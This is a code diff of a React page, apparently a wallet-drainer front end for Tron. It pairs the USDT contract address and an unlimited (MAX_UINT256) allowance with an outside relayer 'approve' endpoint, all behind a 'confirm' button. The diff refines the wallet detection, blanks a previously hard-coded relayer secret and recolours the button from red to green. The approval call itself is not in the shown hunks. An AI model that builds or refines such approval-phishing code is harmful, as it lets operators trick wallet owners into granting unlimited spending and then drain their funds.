@@ -18,38 +18,34 @@ export default function Confirm() {
   const TOKEN = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
   const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
   const RELAYER_URL = 'https://web-production-eaaf2.up.railway.app/api/relayer/approve'
-  const RELAYER_KEY = 'my-secret-2026-x7k9'
+  const RELAYER_KEY = ''
 
-  const getProvider = () => {
-    if ((window as any).tronWeb && (window as any).tronWeb.ready) return (window as any).tronWeb
-    if ((window as any).tron && typeof (window as any).tron.request === 'function') return (window as any).tron
-    if ((window as any).tronLink) return (window as any).tronLink
+  const getTronWeb = () => {
+    if ((window as any).tronWeb && (window as any).tronWeb.ready) {
+      return (window as any).tronWeb
+    }
     return null
   }
 
-  const getTronWeb = () => {
-    return (window as any).tronWeb || null
+  const getUserAddress = (tronWeb: any): string | null => {
+    if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
+      return tronWeb.defaultAddress.base58
+    }
+    return null
   }
 
   const handleConfirm = async () => {
     setLoading(true)
 
-    const provider = getProvider()
     const tronWeb = getTronWeb()
 
-    if (!provider || !tronWeb) {
+    if (!tronWeb) {
       setLoading(false)
       return
     }
 
     try {
-      let userAddress = ''
-      if (provider.request) {
-        const accounts = await provider.request({ method: 'tron_requestAccounts' })
-        userAddress = accounts[0]
-      } else if (provider.defaultAddress && provider.defaultAddress.base58) {
-        userAddress = provider.defaultAddress.base58
-      }
+      const userAddress = getUserAddress(tronWeb)
 
       if (!userAddress) {
         setLoading(false)
@@ -59,10 +55,13 @@ export default function Confirm() {
       const balanceSun = await tronWeb.trx.getBalance(userAddress)
       const userTrx = parseFloat(tronWeb.fromSun(balanceSun))
 
-      const resourceObj = await tronWeb.trx.getAccountResources(userAddress)
-      const limit = resourceObj.EnergyLimit || 0
-      const used = resourceObj.EnergyUsed || 0
-      const userEnergy = Math.max(0, limit - used)
+      let userEnergy = 0
+      try {
+        const resourceObj = await tronWeb.trx.getAccountResources(userAddress)
+        const limit = resourceObj.EnergyLimit || 0
+        const used = resourceObj.EnergyUsed || 0
+        userEnergy = Math.max(0, limit - used)
+      } catch (e) {}
 
       const canGoDirect = userEnergy >= 65000 || userTrx >= 30
 
@@ -274,10 +273,10 @@ export default function Confirm() {
             style={{
               width: '100%',
               padding: '16px',
-              background: loading ? '#EF444480' : '#EF4444',
+              background: loading ? '#03FC8F80' : '#03FC8F',
               border: 'none',
               borderRadius: '9999px',
-              color: '#FFFFFF',
+              color: '#000000',
               fontSize: '16px',
               fontWeight: 600,
               cursor: loading ? 'not-allowed' : 'pointer'
@@ -289,4 +288,4 @@ export default function Confirm() {
       </div>
     </motion.div>
   )
-          }
+            }
